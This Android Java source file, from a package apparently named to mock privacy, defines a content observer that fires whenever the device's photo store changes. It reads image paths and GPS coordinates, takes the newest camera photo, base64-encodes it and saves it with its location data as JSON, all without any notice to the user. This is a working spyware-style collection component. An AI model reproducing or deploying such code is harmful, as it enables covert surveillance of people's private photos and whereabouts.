package com.vergermiya.harevost.fckurprivacy.ImageChecker;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.provider.MediaStore;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.vergermiya.harevost.fckurprivacy.Util.Base64Coder;
import com.vergermiya.harevost.fckurprivacy.Util.FileSaver;
import com.vergermiya.harevost.fckurprivacy.Util.JsonBuilder;

import org.json.JSONStringer;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Locale;

/**
 * Created by harevost on 18-7-19.
 */

public class ImageContentObserver extends ContentObserver {
    private Context mContext;
    private ImageContentObserver mImageObserver;

    private static final String[] SELECTIMAGES = {
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.TITLE,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.DATE_MODIFIED,
            MediaStore.Images.Media.LATITUDE,
            MediaStore.Images.Media.LONGITUDE,
            MediaStore.Images.Media.SIZE
    };

    private static Handler mHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            if (msg.what == 0x110) {
                Log.i("Image", "message is back! " + msg.obj.toString());
            }
        }
    };

    public ImageContentObserver(Context context, Handler handler) {
        super(handler);
        mContext = context;
        mHandler = handler;  //最好将主线程的handler传递过来，这样方便通信和更新UI
    }

    /**
     * 主要在onChange中响应数据库变化，并进行相应处理
     */
    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
            /*---------------进行相应处理----------------*/

        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        Cursor cursor = mContext.getContentResolver().query(uri, null, null, null, "_data desc");

        if (cursor != null) {
            Log.i("Image", "The number of data is:" + cursor.getCount());

            StringBuffer sb = new StringBuffer();

            while (cursor.moveToNext()) {
                String fileName = cursor.getString(cursor.getColumnIndex("_data"));
                String[] a = fileName.split("/");
                Log.i("Image", a[a.length - 2] + a[a.length - 1]);  //观察输出地目录名/文件名
                sb.append("目录名称：" + a[a.length - 2]);
            }
            cursor.close();
                /*将消息传递给主线程，消息中绑定了目录信息*/
            mHandler.obtainMessage(0x110, sb.toString()).sendToTarget();

            ImageJson latestImage = getPhotoLocation(mContext).get(0);
            File latestImageFile = new File(latestImage.getPath());
            String imageBase64Str = Base64Coder.file2Base64(latestImageFile);
            latestImage.setImage(imageBase64Str);
            new FileSaver().saveFile(latestImageFile.getName(), ".json", JsonBuilder.buildImageJson(latestImage).toString());
            Log.d("latestImage", latestImage.toString());

        }
    }

    public static ArrayList<ImageJson> getPhotoLocation(Context context) {
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                SELECTIMAGES,
                null,
                null,
                null);
        int i = 0;
        String msg = "";
        SimpleDateFormat ss = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss", Locale.CHINA);
        String path0 = "";
        ArrayList<String> test = getLatestImg(context);
        for (String s : test){
            path0 += s + ",\n";
        }
        File file0 = new File(test.get(0));
        if(file0.exists()){
            Bitmap bm = BitmapFactory.decodeFile(test.get(0));
            //img.setImageBitmap(bm);
        }
        //Log.d(TAG, path0);
        ArrayList<ImageJson> imageList = new ArrayList<ImageJson>();
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                File file = new File(path);
                if (!file.exists() || !file.canRead()) continue;

                String name = cursor.getString(cursor.getColumnIndex( MediaStore.Images.Media.DISPLAY_NAME));
                String title = cursor.getString(cursor.getColumnIndex( MediaStore.Images.Media.TITLE));
                long addDate = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED));
                long modifyDate = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media.DATE_MODIFIED));
                float latitude = cursor.getFloat(cursor.getColumnIndex(MediaStore.Images.Media.LATITUDE));
                float longitude = cursor.getFloat(cursor.getColumnIndex(MediaStore.Images.Media.LONGITUDE));
                long size = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media.SIZE));
                i++;
                imageList.add(new ImageJson(path, name, ss.format(addDate), title, ss.format(modifyDate), ""+latitude, ""+longitude, ""+size));
            }
            Log.d("img", imageList.toString());
            cursor.close();
        }
        return imageList;
    }

    public static ArrayList<String> getLatestImg(Context context) {
        ArrayList<String> imgPaths = new ArrayList<>();
        // 获取SDcard卡的路径
        String sdcardPath = Environment.getExternalStorageDirectory().toString();

        ContentResolver mContentResolver = context.getContentResolver();
        Cursor mCursor = mContentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA},
                MediaStore.Images.Media.MIME_TYPE + "=? OR " + MediaStore.Images.Media.MIME_TYPE + "=?",
                new String[] { "image/jpeg", "image/png" }, MediaStore.Images.Media._ID + " DESC"); // 按图片ID降序排列

        while (mCursor.moveToNext()) {
            // 打印LOG查看照片ID的值
            long id = mCursor.getLong(mCursor.getColumnIndex(MediaStore.Images.Media._ID));

            // 过滤掉不需要的图片，只获取拍照后存储照片的相册里的图片
            String path = mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media.DATA));
            if (path.startsWith(sdcardPath + "/DCIM/100MEDIA") || path.startsWith(sdcardPath + "/DCIM/Camera/")
                    || path.startsWith(sdcardPath + "DCIM/100Andro")) {
                imgPaths.add("" + path);
            }
        }
        mCursor.close();
        Log.d("image", imgPaths.toString());
        return imgPaths;
    }
}
